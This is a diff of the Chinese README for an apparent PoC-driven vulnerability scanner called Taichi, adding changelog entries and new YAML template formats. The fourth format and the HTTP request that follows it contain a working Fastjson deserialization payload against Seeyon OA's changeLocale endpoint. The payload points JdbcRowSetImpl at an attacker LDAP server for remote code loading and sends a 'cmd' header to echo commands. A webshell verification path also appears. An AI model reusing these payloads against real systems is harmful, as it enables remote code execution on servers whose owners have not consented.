@@ -6,25 +6,29 @@
 
 **2023.3.24**
 
-新增识别exp，poc功能
+- 新增识别poc功能
 
-新增扫描多个poc功能
+- 新增扫描多个poc功能
 
-适配[CVE-2023-28432](https://mp.weixin.qq.com/s/vpI3C575BxSPzHNi_oF60w)
+- 适配[CVE-2023-28432](https://mp.weixin.qq.com/s/vpI3C575BxSPzHNi_oF60w)
+
 
 **2023.2.35**
 
-新增poc名称显示
+- 新增poc名称显示
 
-新增蓝凌OApoc
+- 新增蓝凌OApoc
+
 
 **2023.3.26**
 
-重构部分代码，删除attack.py
+- 重构部分代码，删除attack.py
 
-取消type参数
+- 取消type参数
 
-新增致远OApoc
+- 新增致远OApoc
+- 适配dns探测
+- 适配fastjson反序列化
 
 # 前言
 
@@ -34,7 +38,7 @@
 
 # 介绍
 
-支持自定义poc或者exp的漏洞扫描框架
+支持自定义poc的漏洞扫描框架
 
 # 使用方法
 
@@ -130,6 +134,10 @@ python3 Taichi.py -f target.txt -a /root/Taichi/pocs -o result.txt -t 5
 #webshell位置
 - verify:
   - verify : "isNone"
+  
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "isNone"
 ```
 
 #### name
@@ -168,6 +176,14 @@ response包的关键词，用于判断漏洞是否存在，目前只可以支持
 "isNone"
 ```
 
+#### cmd
+
+不需要的时候写成
+
+```
+"isNone"
+```
+
 ### 第二种poc.yaml格式
 
 ```
@@ -199,6 +215,10 @@ response包的关键词，用于判断漏洞是否存在，目前只可以支持
 #webshell位置
 - verify:
   - verify : "/shell.php?cmd=phpinfo();"
+  
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "isNone"
 ```
 
 这里就只介绍和不一样的地方
@@ -216,6 +236,116 @@ response包的关键词，这里的关键字是**二次请求**response包的关
 #### verify
 
 这个地方就是上面说的二次访问验证webshell的地方，如果你传了webshell，这个地方就填入你webshell的路径，例如：http://192.168.0.1/a/b/b.jsp，那这个地方就填入/a/b/b.jsp
+
+## 第三种yaml格式
+
+```
+#poc名称
+- name:
+  - name: "SeeyouOA_A8_status_jsp_sensitive_information_disclosure1"
+
+#请求方式
+- method:
+  - method: "get"
+
+#payload
+- payload:
+  - payload: "isNone"
+
+#response包里的关键字
+- word:
+  - word:
+      - "OS"
+
+#漏洞的位置
+- url:
+  - url : "/seeyon/management/status.jsp"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
+
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "isNone"
+```
+
+#### payload
+
+```
+  - payload: "isNone"
+```
+
+这种无payload，信息泄露用这种较多
+
+## 第四种yaml格式
+
+```
+#poc名称
+- name:
+  - name: "SeeyouOA_Fastjson_Deserialization"
+
+#请求方式
+- method:
+  - method: "post"
+
+#payload
+- payload:
+  - payload: '_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<IP>:1289/TomcatBypass/TomcatEcho","autoCommit":true}}'
+
+#response包里的关键字
+- word:
+  - word:
+      - "root"
+
+#漏洞的位置
+- url:
+  - url : "/seeyon/main.do?method=changeLocale"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
+
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "whoami"
+```
+
+#### cmd
+
+```
+  - cmd : "whoami"
+```
+
+这种cmd有参数，之所以这样写，是因为request包有cmd参数
+
+```
+POST /seeyon/main.do?method=changeLocale HTTP/1.1
+Host: x.x.x.x
+Content-Length: 221
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+cmd: ipconfig   #！！！这里！！！
+
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=26FF8158707BB0896A3ACD66EB92DD41; loginPageURL=
+Connection: close
+
+_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xxx.xxx.xxx:1289/TomcatBypass/TomcatEcho","autoCommit":true}}
+```
 
 **总之，所有的参数都是重要的，参数错误或位置错误会导致报错或扫描失败，所以请不要随意更改参数位置并正确填写参数！**
 
